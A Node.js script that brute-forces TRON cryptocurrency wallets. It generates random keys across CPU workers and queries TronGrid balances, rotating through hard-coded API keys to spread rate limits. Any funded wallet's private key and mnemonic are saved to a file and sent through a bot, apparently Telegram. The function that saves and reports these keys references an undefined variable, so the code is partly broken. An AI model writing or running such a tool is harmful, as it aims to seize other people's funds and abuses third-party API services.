const TronWeb = require("tronweb");
const crypto = require("crypto");
const numCPUs = require("os").cpus().length;
const cluster = require("cluster");
const fs = require("fs");
const util = require("util");

const bot = require("./bot");

const readFile = util.promisify(fs.readFile);
const writeFile = util.promisify(fs.writeFile);

var privateKey = crypto.randomBytes(32).toString("hex");

const wait = (time) =>
  new Promise((resolve, reject) => setTimeout(resolve, time));

const savePrivateKey = async (address, privateKey, mnemonic) => {
  try {
    const data = await readFile("privateKeys.txt", "utf8");

    console.log(data);

    writeFile(
      "privateKeys.txt",
      data +
        `\n\nAddress: ${address}\nPrivate: ${privateKey}\nMnemonic: ${mnemonic}`,
      "utf8"
    );
  } catch (err) {
    console.log(err);
  }

  try {
    await bot.sendMessage(
      `New wallet found:\nAddress: ${wallet.address} \nPrivate key: ${wallet.privateKey} \nMnemonic: ${wallet.mnemonic.phrase}`
    );
  } catch (err) {
    console.log(err);
  }
};

const apiKeys = [
  "c594d04a-a70e-4b92-9c32-bdfdd2a41dcd",
  "b521e686-366b-4c54-be2a-eb050c14a5f9",
  "fcc10a34-ae8d-4baa-bfd5-8f2d17ab5da9",
  "97fa5109-12ec-4d3f-8c3e-ed66e44d77e8",
  "69153ee2-1384-4dfa-9ab9-0f50b9d288a0",
  "7b5e5c16-dcc7-4638-842e-8fe36a419dc5",
];

const trons = Object.fromEntries(
  apiKeys.map((apiKey) => [
    apiKey,
    new TronWeb({
      fullHost: "https://api.trongrid.io",
      headers: { "TRON-PRO-API-KEY": apiKey },
      privateKey: privateKey,
    }),
  ])
);

const useWait = () => new Promise((resolve) => setTimeout(resolve, 3000));

const bruteForce = async (apiKey) => {
  try {
    const wallet = TronWeb.createRandom();
    const balance = await trons[apiKey].trx.getBalance(wallet.address);

    console.log(wallet.address, balance);

    if (balance > 0) {
      await savePrivateKey(
        wallet.address,
        wallet.privateKey,
        wallet.mnemonic.phrase
      );
    }
  } catch (err) {
    console.log(err);
    // if (err.response?.status === 403) {
    //   apiIndex = apiIndex + 1 >= apiList.length ? 0 : apiIndex + 1;
    //   tronWeb = apiList[apiIndex];
    //   console.log("apiIndex", apiIndex, "count", count);
    // count = 0;
    // }
  }
  await wait(20);
  await bruteForce(apiKey);
};

if (cluster.isMaster) {
  const needed = apiKeys.length > numCPUs ? numCPUs : apiKeys.length;

  for (let i = 0; i < needed; i++) {
    cluster.fork();
  }
} else {
  const workerIndex = cluster.worker.id - 1;

  const apiKey = apiKeys[workerIndex];

  if (!apiKey) return process.exit();

  bruteForce(apiKey);
}
